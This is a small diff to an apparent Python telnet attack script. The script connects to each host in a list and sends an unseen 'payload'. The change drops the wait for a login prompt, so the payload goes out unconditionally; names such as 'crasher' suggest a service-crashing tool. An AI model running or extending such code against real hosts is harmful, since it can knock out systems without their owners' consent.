@@ -23,9 +23,7 @@ tn = telnetlib.Telnet()
  
 def conn(crasher):
         tn.open(crasher, port, timeout)
-        read = tn.read_all()
-        if "sername" in read or "ogin" in read:
-            tn.write(payload)
+        tn.write(payload)
 
        
 for crasher in host:
